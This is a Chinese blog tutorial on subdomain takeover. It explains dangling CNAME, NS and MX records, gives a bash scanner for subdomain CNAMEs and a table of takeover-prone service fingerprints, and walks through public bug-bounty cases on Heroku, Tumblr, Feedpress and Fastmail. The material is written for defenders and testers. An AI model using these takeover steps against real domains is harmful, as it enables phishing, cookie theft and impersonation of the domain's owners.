{"title":"Subdomain-Takeover子域名接管原理和利用案例","slug":"网安大类/PenetrationNote/域名解析/Subdomain-Takeover子域名接管原理和利用案例","date":"2019-09-17T02:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/9-17-400.html","path":"api/articles/2019/9-17-400.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924104446.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924125006.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924104903.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924105355.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924110100.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924092823.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924093116.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924093417.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100206.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100302.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100445.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232412.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232436.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232454.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924101431.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924101657.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p>描述:子域名接管漏洞通常被滥用于以下几个目的：恶意软件分发、网络钓鱼/鱼叉式网络钓鱼、XSS 、身份验证绕过等等。由于某些证书颁发机构仅需要域验证，因此也可以轻松生成SSL证书。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub.expample.com(常规域名) 60 IN CNAME anotherdomain.com.(规范域名)</span><br></pre></td></tr></table></figure></p>\n<p>子域名接管是注册不存在的域名以获得对另一个域的控制权的过程常见的情况如下：</p>\n<ul>\n<li>1.域名（例如sub.example.com）将CNAME记录用于另一个域（例如sub.example.com CNAME anotherdomain.com）。</li>\n<li>2.在某个时间点，anotherdomain.com到期并可供任何人注册。</li>\n<li>3.由于未从example.com DNS区域删除CNAME记录，因此注册anotherdomain.com的任何人都可以完全控制sub.example.com，直到删除DNS记录。</li>\n</ul>\n<p>注意事项：</p>\n<ul>\n<li>使用子域名接管，攻击者可以从合法域发送网络钓鱼电子邮件，执行跨站点脚本（XSS）或破坏与域关联的品牌声誉。</li>\n<li>子域名接管不仅限于CNAME记录/NS记录/MX记录甚至A记录也会受到影响。</li>\n</ul>\n<hr>\n\n<h4 id=\"0x01-子域名接管原理\"><a href=\"#0x01-子域名接管原理\" class=\"headerlink\" title=\"0x01 子域名接管原理\"></a>0x01 子域名接管原理</h4><p>描述:我们在了解子域名接管的时候需要了解一哈DNS解析流程：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924104446.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>CNAME记录的域名的Web浏览器的行为流程:<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924125006.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br><br><em>子域名接管漏洞类型:</em></p>\n<ul>\n<li>CNAME子域名接管: CNAME子域接管的主要类型之一是叫做互联网常规域名的规范域</li>\n<li>NS子域名接管: 一个NS记录的规范域名的基本域可用于注册</li>\n<li>MX子域名接管</li>\n</ul>\n<p>(1)CNAME子域名接管漏洞的成因:</p>\n<ul>\n<li>因为域名（源域名）配置了CNAME，但是CNAME指向的域名并没有被注册。那么攻击者可以注册这个CNAME指向的域名，就可以控制了源域名。</li>\n<li>危害：绕过HttpOnly和Secure Cookie的安全配置，盗取用户的cookie</li>\n<li>CNAME子域名接管的整个流程如下：<ul>\n<li>1.源域名(sub.example.com)设置了一个CNAME且指向了sub.weiyigeek.github.io记录</li>\n<li>2.检查weiyigeek.github.io是否被注册,如果没有注册就可以注册创建恶意页面最终接管sub.example.com</li>\n</ul>\n</li>\n</ul>\n<p>(2)NS子域名接管漏洞的成因:</p>\n<ul>\n<li>域名的NS记录中如果有一个域名没有被注册那么这个域名就可能被接管。(<code>查找类似SERVFAIL或的响应，REFUSED并根据其发出警报</code>)  </li>\n<li>例如：sub.example.com有两个NS记录，分别是ns1.vuln.com, ns2.novuln.com，<ul>\n<li>如果攻击者注册了vuln.com这个域名，那么就有50%的几率受到攻击。</li>\n<li>如果DNS解析选择了ns1.vuln.com，那么攻击者可以返回一个钓鱼页面，并非原来sub.example.com的页面，并且会缓存很长的时间，攻击者可以设置TTL的时长。</li>\n</ul>\n</li>\n</ul>\n<p>(3)MX子域名接管漏洞的成因: </p>\n<ul>\n<li>由于MX记录仅用于接收电子邮件，因此在MX记录中获得对规范域名的控制仅允许攻击者接收发往源域名的电子邮件(邮件伪造)。</li>\n<li>虽然影响不如CNAME或NS子域名接管那么重要，但MX子域名接管可能会在鱼叉式网络钓鱼攻击和知识产权窃取中发挥作用。</li>\n</ul>\n<p><em>原理解析案例:</em></p>\n<ul>\n<li>假如我拥有一个wolframe.eu用于测试目的的域名,通过更改dig谷歌DNS服务器@8.8.8.8此域的（权威）名称服务器,为四个AWS服务器之一来获得权威性答案：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dig ns wolframe.eu@8.8.8.8 +nostats</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924104903.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></li>\n<li>实际DNS区域是由AWS管理的（更具体地说是AWS Route53）,比如上面指定NS记录指向的DNS服务器是不权威的，则得到的结果是不权威的答案(非权威性意味着它不是由权威DNS服务器（在此示例中为四个AWS之一）返回的,相当于是一个中间人的形式;</li>\n<li><p>您可以看见wolframe.eu本身只有一个A记录设置为1.1.1.1;所以一旦DNS请求*.wolframe.eu就会随机选择这上面这四个AWS名称服务器之一并返回A记录结果;</p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924105355.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n<li><p>采用DNSPython模块自定义DNS解析器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import dns</span><br><span class=\"line\">import dns.rdatatype</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> NAMESERVER_IP <span class=\"keyword\">in</span> NAMESERVER_IPS:</span><br><span class=\"line\">    custom_resolver = dns.resolver.Resolver()</span><br><span class=\"line\">    custom_resolver.nameservers = [NAMESERVER_IP]</span><br><span class=\"line\">    q = custom_resolver.query(DOMAIN, dns.rdatatype.A)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>总体而言，应通过以下过程扩展自动化：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924110100.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>注意事项:</p>\n<ul>\n<li>Web浏览器隐式地信任放在DNS解析器返回的任何内容上。这种信任意味着当攻击者获得对DNS记录的控制时，绕过所有Web浏览器安全策略（例如，同源策略）。带来相当大的安全威胁，因为子域名接管会破坏域名的真实性，攻击者可以通过多种方式利用域名的真实性</li>\n</ul>\n<hr>\n\n<h4 id=\"0x02-子域名接管检查\"><a href=\"#0x02-子域名接管检查\" class=\"headerlink\" title=\"0x02 子域名接管检查\"></a>0x02 子域名接管检查</h4><p>描述：子域名接管检查漏洞主要是看 CNAME，因此我们可以把收集到子域名的CNAME找出来(当然MX/A也可以但是出现这样的机率是非常少的)；<br>漏洞检查工具: EdOverflow的can-i-take-over-xyz<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\">#!Coded by Suleman Malik</span></span><br><span class=\"line\"><span class=\"comment\">#!www.sulemanmalik.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">cont</span></span>()&#123;</span><br><span class=\"line\">rm /tmp/cnames</span><br><span class=\"line\">rm /tmp/cname-ln</span><br><span class=\"line\">rm /tmp/fn-py</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">bl</span></span>()&#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\033[0;31m-------------------------------------------------------------\\033[0m\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">ban</span></span>()&#123;</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">  ________                                                                   </span></span><br><span class=\"line\"><span class=\"string\"> /__  ___/                                                           </span></span><br><span class=\"line\"><span class=\"string\">   / /   ___     / ___      ___      ___              ___      __    </span></span><br><span class=\"line\"><span class=\"string\">  / /  //   ) ) //\\ \\     //___) ) //   ) ) ||  / / //___) ) //  ) ) </span></span><br><span class=\"line\"><span class=\"string\"> / /  //   / / //  \\ \\   //       //   / /  || / / //       //       </span></span><br><span class=\"line\"><span class=\"string\">/ /  ((___( ( //    \\ \\ ((____   ((___/ /   ||/ / ((____   //        </span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"string\">''</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cont &gt; /dev/null 2&gt;&amp;1</span><br><span class=\"line\">clear                                                                        </span><br><span class=\"line\">ban</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\033[0;32m  @sulemanmalik_3                              v1\\033[0m\"</span></span><br><span class=\"line\">bl</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"File Name:\"</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> inp</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span></span><br><span class=\"line\">cot=0</span><br><span class=\"line\">lof=$(wc -l &lt; <span class=\"variable\">$inp</span> | sed <span class=\"string\">'s/ //g'</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">read</span> dom</span><br><span class=\"line\"><span class=\"keyword\">do</span> </span><br><span class=\"line\">  cot=$((<span class=\"variable\">$cot</span> + 1))</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> -ne <span class=\"string\">\"\\033[0;32mScanning Subdomains:\\033[0m <span class=\"variable\">$cot</span>/<span class=\"variable\">$lof</span>\\r\"</span></span><br><span class=\"line\">  cname=$( dig CNAME <span class=\"variable\">$dom</span> | grep <span class=\"string\">\"CNAME\"</span> | tail -n1 | cut -c<span class=\"string\">\"29-\"</span> | sed <span class=\"string\">'s/^.*E//'</span> &gt;&gt; /tmp/cnames)</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$cot</span> - <span class=\"variable\">$dom</span> --&gt; \"</span> &gt;&gt; /tmp/cname-ln</span><br><span class=\"line\"><span class=\"keyword\">done</span> &lt; <span class=\"variable\">$inp</span></span><br><span class=\"line\">  prog=$(awk <span class=\"string\">'NR==FNR&#123;a[++y]=$0;next&#125;&#123;b[++x]=$0&#125;</span></span><br><span class=\"line\"><span class=\"string\">  END&#123;z=x&gt;y?x:y;while(++i&lt;=z)&#123;print a[i],b[i]&#125;&#125;'</span> /tmp/cname-ln /tmp/cnames &gt; /tmp/fn-py)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span></span><br><span class=\"line\">cat /tmp/fn-py</span><br><span class=\"line\">sleep 1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">''</span></span><br><span class=\"line\">bl</span><br><span class=\"line\">cont &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924092823.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<hr>\n\n<h4 id=\"0x03-子域名接管利用案例\"><a href=\"#0x03-子域名接管利用案例\" class=\"headerlink\" title=\"0x03 子域名接管利用案例\"></a>0x03 子域名接管利用案例</h4><p>描述:关于子域名接管首先先得有能让你接管的子域名，所以我们针对子域名要进行收集，然后对比指纹查看是否有接管的可能。<br>常常使用dig、nslookup、host等命令进行收集查看:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nslookup c1h2e1.github.io</span><br><span class=\"line\">$ host c1h2e1.github.io</span><br><span class=\"line\">$ dig c1h2e1.github.io</span><br></pre></td></tr></table></figure></p>\n<p>记录一些典型案例:</p>\n<p><strong>案例1：feedpress子域名接管</strong><br>参考案例:<a href=\"https://hackerone.com/reports/195350\" target=\"_blank\" rel=\"noopener\">https://hackerone.com/reports/195350</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#podcasts.slack-core.com是CNAME'd to redirect.feedpress.me:</span></span><br><span class=\"line\">$ dig podcasts.slack-core.com </span><br><span class=\"line\"></span><br><span class=\"line\">;; OPT PSEUDOSECTION:</span><br><span class=\"line\">; EDNS: version: 0, flags:; udp: 512</span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;podcasts.slack-core.com.   IN  A</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">podcasts.slack-core.com. 299    IN  CNAME   redirect.feedpress.me.</span><br><span class=\"line\">redirect.feedpress.me.  3599    IN  A   5.135.16.40</span><br><span class=\"line\"></span><br><span class=\"line\">;; Query time: 253 msec</span><br><span class=\"line\">;; SERVER: 8.8.8.8<span class=\"comment\">#53(8.8.8.8)</span></span><br></pre></td></tr></table></figure><br>思路:首先执行了dig命令发现解析了 redirect.feedpress.me 然而feedpress可以导致子域名接管，通过在Feed上创建我自己的帐户并且注册设置podcasts.slack-core.com作为我订阅的“自定义域名”，在它通过Feed传播之后最终成功的接管了域名podcasts.slack-core.com提供的内容。</p>\n<p><br></p>\n<p><strong>案例2：Heroku子域名接管</strong><br>描述：该漏洞是CNAME子域名接管漏洞类型案例;<br>页面特征:<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924093116.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>利用条件：CNAME指向 herokudns.com的子域如果一个子域使用Heroku 服务的子域名，例如 vuln.example.com 显示如上错误页面，当通过子域名挖掘时，他就会产生子域名接管漏洞</p>\n<blockquote>\n<p>vuln.example.com  60  IN   CNAME vuln.example.com.herokudns.com</p>\n</blockquote>\n<p><em>漏洞利用:</em><br>1.注册Heroku（<a href=\"https://signup.heroku.com/\" target=\"_blank\" rel=\"noopener\">https://signup.heroku.com/</a>)<br>2.在Heroku上部署应用程序。<br>(1)安装git<br>(2)安装 heroku cli<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https:&#x2F;&#x2F;cli-assets.heroku.com&#x2F;install.sh | sh</span><br></pre></td></tr></table></figure><br>(3)创建一个简单页面<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\">mkdir herokudeploy</span><br><span class=\"line\"><span class=\"built_in\">cd</span> herokudeploy</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"&#123;&#125;\"</span> &gt; composer.json</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Subdomain takeover PoC\"</span> &gt; index.html</span><br><span class=\"line\">touch index.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#编辑index.php</span></span><br><span class=\"line\">&lt;?php header( <span class=\"string\">'Location: /index.html'</span> ) ; ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#接下来，</span></span><br><span class=\"line\">git init</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">\"just simple poc\"</span></span><br><span class=\"line\">heroku apps:create justsimplesubdomaintakeoverpoc</span><br></pre></td></tr></table></figure><br>如果Heroku中不存在应用程序的名称，则将创建应用程序。此外如果您从未登录过Heroku，系统会要求您提供Heroku帐户电子邮件和密码。请登录然后将本地文件推送到Heroku仓库。</p>\n<blockquote>\n<p>git push heroku master</p>\n</blockquote>\n<p>您正在部署的应用程序可以在*.herokuapp.com中看到。<br>本教程中的示例变为：<a href=\"https://justsimplesubdomaintakeoverpoc.herokuapp.com\" target=\"_blank\" rel=\"noopener\">https://justsimplesubdomaintakeoverpoc.herokuapp.com</a><br>3.添加要覆盖的子域,然后添加域即可<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924093417.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>案例3：Tumblr子域名接管</strong><br>描述：该漏洞是CNAME子域名接管漏洞类型案例;<br>要在Tumblr中使用自定义域，我们需要添加A记录，如果使用的是主域则该记录将指向66.6.44.4，如果Tumblr自定义域位于子域上则添加CNAME，例如我的blog.site.com然后CNAME是您拥有的tumblr子域site.tumblr.com。<br>攻击过程:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ curl -I www.leifroswold.com</span><br><span class=\"line\">HTTP/1.1 404 Not Found</span><br><span class=\"line\">Server: openresty</span><br><span class=\"line\">Date: Mon, 24 Sep 2018 15:14:30 GMT</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">X-Rid: 57de79ef9b33ae549a1795eecfd68570</span><br><span class=\"line\">P3p: CP=Tumblr s privacy policy is available here: https://www.tumblr.com/policy/en/priva</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#用dig查看他以前用过的tumblr用户名。</span></span><br><span class=\"line\">$ dig www.leifroswold.com</span><br><span class=\"line\">.....</span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">www.leifroswold.com.    942     IN      A       66.6.44.4  <span class=\"comment\">#这里配置错误实际应该设置CNAME指向字节Tumblr域名</span></span><br></pre></td></tr></table></figure>\n<p>现在转到您的Tumblr博客设置然后更改域名,因为没有创建CNAME记录，我们可以使用任何用户名的tumblr子域。只需要添加想要定义的域然后保存即可;<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100206.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>案例4：Fastmail 子域名接管</strong><br>描述:Fastmail也存在子域名接管漏洞。因为当我们设置自定义域时没有额外的验证。<br>漏洞特征：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100302.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>利用条件：</p>\n<ul>\n<li>1.CNAME 可定义为 web.messagingengine.com</li>\n<li>2.A 记录 指向 66.111.4.53   66.111.4.54</li>\n</ul>\n<p>漏洞利用：<br>第一步是添加要覆盖的自定义域。进入设置菜单，然后进入域。<br>第二步是创建网站。成功添加要覆盖的域后，现在我们创建公共站点。首先在左下角菜单中，选择“ 文件”,上传html文件。<br>第三步是单击 websites 设置域名,最终使用<a href=\"http://www.zafkiel.net接管\" target=\"_blank\" rel=\"noopener\">www.zafkiel.net接管</a>  web.messagingengine.com。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924100445.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><em>总结可接管服务：</em><br>参考:<a href=\"https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md</a><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232412.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232436.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190923232454.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>补充:启发式测试以确定是否可以接管子域/域<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Engine \tPossible \tFingerprint \tReference</span><br><span class=\"line\">AWS/S3 \tYes \tThe specified bucket does not exist</span><br><span class=\"line\">Bitbucket \tYes \tRepository not found</span><br><span class=\"line\">Campaign Monitor \tYes \tSupport Page</span><br><span class=\"line\">Cargo Collective \tYes \t404 Not Found \tCargo Support Page</span><br><span class=\"line\">Cloudfront \tYes \tBad Request: ERROR: The request could not be satisfied \thttps://blog.zsec.uk/subdomainhijack/</span><br><span class=\"line\">Desk \tNo</span><br><span class=\"line\">Fastly \tYes \tFastly error: unknown domain:</span><br><span class=\"line\">Feedpress \tYes \tThe feed has not been found. \thttps://hackerone.com/reports/195350</span><br><span class=\"line\">Freshdesk \tNo \tFreshdesk Support Page</span><br><span class=\"line\">Ghost \tYes \tThe thing you were looking <span class=\"keyword\">for</span> is no longer here, or never was</span><br><span class=\"line\">Github \tYes \tThere isn<span class=\"string\">'t a Github Pages site here. \thttps://hackerone.com/reports/263902</span></span><br><span class=\"line\"><span class=\"string\">Gitlab \tNo \thttps://hackerone.com/reports/312118</span></span><br><span class=\"line\"><span class=\"string\">Google Cloud Storage \tNo</span></span><br><span class=\"line\"><span class=\"string\">Help Juice \tYes \tWe could not find what you'</span>re looking <span class=\"keyword\">for</span>. \tHelp Juice Support Page</span><br><span class=\"line\">Help Scout \tYes \tNo settings were found <span class=\"keyword\">for</span> this company: \tHelpScout Docs</span><br><span class=\"line\">Heroku \tYes \tNo such app</span><br><span class=\"line\">JetBrains \tYes \tis not a registered InCloud YouTrack</span><br><span class=\"line\">Mashery \tNo \tUnrecognized domain \thttps://hackerone.com/reports/275714</span><br><span class=\"line\">Microsoft Azure \tYes</span><br><span class=\"line\">Sendgrid \tNo</span><br><span class=\"line\">Shopify \tYes \tSorry, this shop is currently unavailable.</span><br><span class=\"line\">Squarespace \tNo</span><br><span class=\"line\">Statuspage \tYes \tYou are being redirected \thttps://hackerone.com/reports/49663</span><br><span class=\"line\">Surge.sh \tYes \tproject not found \thttps://surge.sh/<span class=\"built_in\">help</span>/adding<span class=\"_\">-a</span>-custom-domain</span><br><span class=\"line\">Tumblr \tYes \tWhatever you were looking <span class=\"keyword\">for</span> doesn<span class=\"string\">'t currently exist at this address</span></span><br><span class=\"line\"><span class=\"string\">Tilda \tNo \tPlease renew your subscription</span></span><br><span class=\"line\"><span class=\"string\">Unbounce \tYes \tThe requested URL was not found on this server. \thttps://hackerone.com/reports/202767</span></span><br><span class=\"line\"><span class=\"string\">UserVoice \tYes \tThis UserVoice subdomain is currently available!</span></span><br><span class=\"line\"><span class=\"string\">Wordpress \tYes \tDo you want to register *.wordpress.com?</span></span><br><span class=\"line\"><span class=\"string\">WP Engine \tNo</span></span><br><span class=\"line\"><span class=\"string\">Zendesk \tYes \tHelp Center Closed \tZendesk 